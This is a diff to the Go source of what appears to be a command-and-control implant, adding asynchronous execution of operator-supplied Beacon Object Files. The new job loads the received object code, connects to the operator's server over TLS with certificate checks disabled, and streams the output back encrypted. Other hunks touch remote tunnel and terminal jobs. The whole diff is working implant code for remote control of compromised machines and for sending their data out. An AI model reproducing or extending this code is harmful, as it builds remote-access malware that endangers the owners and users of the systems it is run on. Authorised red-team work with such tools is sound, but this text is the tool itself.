@@ -81,6 +81,9 @@ func TaskProcess(commands [][]byte) [][]byte {
 		case utils.COMMAND_EXEC_BOF:
 			data, err = taskExecBof(command.Data)
 
+		case utils.COMMAND_EXEC_BOF_ASYNC:
+			data, err = jobExecBofAsync(command.Data)
+
 		case utils.COMMAND_EXIT:
 			data, err = taskExit()
 
@@ -653,6 +656,215 @@ func taskZip(paramsData []byte) ([]byte, error) {
 
 /// JOBS
 
+func jobExecBofAsync(paramsData []byte) ([]byte, error) {
+
+	var params utils.ParamsExecBof
+	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
+		return nil, err
+	}
+
+	args, err := base64.StdEncoding.DecodeString(params.ArgsPack)
+	if err != nil {
+		args = make([]byte, 1)
+	}
+
+	asyncBof, errLoad := coffer.LoadAsync(params.Object, args, SignalWakeup)
+	if errLoad != nil {
+		return nil, errLoad
+	}
+
+	var conn net.Conn
+	if profile.UseSSL {
+		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
+		if certerr != nil {
+			return nil, err
+		}
+
+		caCertPool := x509.NewCertPool()
+		caCertPool.AppendCertsFromPEM(profile.CaCert)
+
+		config := &tls.Config{
+			Certificates:       []tls.Certificate{cert},
+			RootCAs:            caCertPool,
+			InsecureSkipVerify: true,
+		}
+		conn, err = tls.Dial("tcp", profile.Addresses[0], config)
+
+	} else {
+		conn, err = net.Dial("tcp", profile.Addresses[0])
+	}
+	if err != nil {
+		return nil, err
+	}
+
+	connection := utils.Connection{
+		PackType: utils.BOF_PACK,
+		JobCancel: func() {
+			asyncBof.Stop()
+		},
+	}
+	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
+	JOBS[params.Task] = connection
+
+	go func() {
+		bofFinished := false
+		defer func() {
+			if bofFinished {
+				asyncBof.Cleanup()
+			}
+			connection.HandleCancel()
+			_ = conn.Close()
+			delete(JOBS, params.Task)
+		}()
+
+		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
+		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.BOF_PACK, Data: jobPack})
+		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
+
+		/// Recv Banner
+		if profile.BannerSize > 0 {
+			_, err := functions.ConnRead(conn, profile.BannerSize)
+			if err != nil {
+				return
+			}
+		}
+
+		/// Send Init
+		_ = functions.SendMsg(conn, jobMsg)
+
+		job := utils.Job{
+			CommandId: utils.COMMAND_EXEC_BOF_ASYNC,
+			JobId:     params.Task,
+		}
+		nullMsgs, _ := msgpack.Marshal(make([]utils.BofMsg, 0))
+		job.Data, _ = msgpack.Marshal(utils.AnsExecBofAsync{Start: true, Msgs: nullMsgs})
+		packedJob, _ := msgpack.Marshal(job)
+
+		message := utils.Message{
+			Type:   2,
+			Object: [][]byte{packedJob},
+		}
+		sendData, _ := msgpack.Marshal(message)
+		sendData, _ = utils.EncryptData(sendData, utils.SKey)
+		functions.SendMsg(conn, sendData)
+
+		/////
+
+		var pendingMsgs []utils.BofMsg
+		bofMsg := utils.BofMsg{}
+		ticker := time.NewTicker(1 * time.Second)
+		defer ticker.Stop()
+
+		running := true
+		for running {
+			select {
+			case <-connection.Ctx.Done():
+				running = false
+
+			case msg, ok := <-asyncBof.Output:
+				if !ok {
+					running = false
+					break
+				}
+				switch v := msg.(type) {
+				case int:
+					bofMsg.Type = v
+				case []byte:
+					bofMsg.Data = v
+					pendingMsgs = append(pendingMsgs, bofMsg)
+					bofMsg = utils.BofMsg{}
+				default:
+					bofMsg = utils.BofMsg{}
+				}
+
+			case <-ticker.C:
+				if len(pendingMsgs) > 0 {
+					packMsgs, _ := msgpack.Marshal(pendingMsgs)
+					ansBofAsync := utils.AnsExecBofAsync{Msgs: packMsgs}
+
+					job.Data, _ = msgpack.Marshal(ansBofAsync)
+					packedJob, _ := msgpack.Marshal(job)
+
+					message := utils.Message{
+						Type:   2,
+						Object: [][]byte{packedJob},
+					}
+					sendData, _ := msgpack.Marshal(message)
+					sendData, _ = utils.EncryptData(sendData, utils.SKey)
+					functions.SendMsg(conn, sendData)
+
+					pendingMsgs = pendingMsgs[:0]
+				}
+			}
+		}
+
+		select {
+		case <-asyncBof.Done:
+			bofFinished = true
+		case <-connection.Ctx.Done():
+			select {
+			case <-asyncBof.Done:
+				bofFinished = true
+			case <-time.After(3 * time.Second):
+			}
+		}
+
+	drainLoop:
+		for {
+			select {
+			case msg, ok := <-asyncBof.Output:
+				if !ok {
+					break drainLoop
+				}
+				switch v := msg.(type) {
+				case int:
+					bofMsg.Type = v
+				case []byte:
+					bofMsg.Data = v
+					pendingMsgs = append(pendingMsgs, bofMsg)
+					bofMsg = utils.BofMsg{}
+				default:
+					bofMsg = utils.BofMsg{}
+				}
+			default:
+				break drainLoop
+			}
+		}
+
+		if len(pendingMsgs) > 0 {
+			packMsgs, _ := msgpack.Marshal(pendingMsgs)
+			ansBofAsync := utils.AnsExecBofAsync{Msgs: packMsgs}
+
+			job.Data, _ = msgpack.Marshal(ansBofAsync)
+			packedJob, _ := msgpack.Marshal(job)
+
+			message := utils.Message{
+				Type:   2,
+				Object: [][]byte{packedJob},
+			}
+			sendData, _ := msgpack.Marshal(message)
+			sendData, _ = utils.EncryptData(sendData, utils.SKey)
+			functions.SendMsg(conn, sendData)
+		}
+
+		/// FINISH
+
+		job.Data, _ = msgpack.Marshal(utils.AnsExecBofAsync{Finish: true, Msgs: nullMsgs})
+		packedJob, _ = msgpack.Marshal(job)
+
+		message = utils.Message{
+			Type:   2,
+			Object: [][]byte{packedJob},
+		}
+
+		sendData, _ = msgpack.Marshal(message)
+		sendData, _ = utils.EncryptData(sendData, utils.SKey)
+		functions.SendMsg(conn, sendData)
+	}()
+
+	return nil, nil
+}
+
 func jobDownloadStart(paramsData []byte) ([]byte, error) {
 	var params utils.ParamsDownload
 	err := msgpack.Unmarshal(paramsData, &params)
@@ -1181,7 +1393,7 @@ func jobTunnel(paramsData []byte) {
 		_, _ = rand.Read(tunIv)
 
 		jobPack, _ := msgpack.Marshal(utils.TunnelPack{Id: uint(AgentId), Type: profile.Type, ChannelId: params.ChannelId, Key: tunKey, Iv: tunIv, Alive: active, Reason: reason})
-		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_TUNNEL, Data: jobPack})
+		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.TUNNEL_PACK, Data: jobPack})
 		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
 
 		/// Recv Banner
@@ -1329,7 +1541,7 @@ func jobTerminal(paramsData []byte) {
 		_, _ = rand.Read(tunIv)
 
 		jobPack, _ := msgpack.Marshal(utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: active, Status: status})
-		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_TERMINAL, Data: jobPack})
+		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.TERMINAL_PACK, Data: jobPack})
 		jobMsg, _ = utils.EncryptData(jobMsg, encKey)
 
 		/// Recv Banner
